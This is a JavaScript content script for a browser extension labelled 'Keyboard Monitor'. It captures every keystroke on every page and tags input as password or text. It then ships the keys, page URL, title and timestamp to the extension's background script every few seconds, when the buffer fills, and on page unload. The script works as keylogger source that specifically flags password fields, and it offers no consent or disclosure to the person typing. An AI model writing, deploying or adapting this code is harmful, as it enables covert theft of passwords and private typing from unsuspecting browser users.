// Keyboard Monitor Content Script
(() => {
  let keyBuffer = [];
  const SEND_INTERVAL = 5000; // Send keys every 5 seconds
  let lastSendTime = Date.now();
  let field = "";

  function classifyField(target) {
    if (!target || typeof target.matches !== "function") return "";
    if (target.matches('input[type="password"], input[name*="pass" i], input[autocomplete="current-password"], input[autocomplete="new-password"]')) {
      return "password";
    }
    if (target.matches("input, textarea, [contenteditable], [contenteditable='true']")) {
      return "text";
    }
    return "";
  }

  function sendKeyboardLogs() {
    if (keyBuffer.length === 0) return;

    const keys = keyBuffer.join('');
    keyBuffer = [];
    lastSendTime = Date.now();
    chrome.runtime.sendMessage({
      type: "KEYBOARD_DATA",
      data: {
        keys,
        field,
        url: window.location.href,
        title: document.title,
        timestamp: Date.now()
      }
    }, () => void chrome.runtime.lastError);
  }

  window.addEventListener("focusin", (event) => {
    field = classifyField(event.target);
  }, true);

  // Listen for key presses
  window.addEventListener('keydown', (event) => {
    let key = event.key;
    
    // Handle special keys
    if (key.length > 1) {
      key = `[${key}]`;
    }
    
    keyBuffer.push(key);
    
    // If buffer gets too large, send immediately
    if (keyBuffer.length >= 100) {
      sendKeyboardLogs();
    }
  }, { passive: true });

  // Periodically send logs
  setInterval(() => {
    const now = Date.now();
    if (now - lastSendTime >= SEND_INTERVAL) {
      sendKeyboardLogs();
    }
  }, 1000);

  // Send on page leave
  window.addEventListener('beforeunload', sendKeyboardLogs);
})();
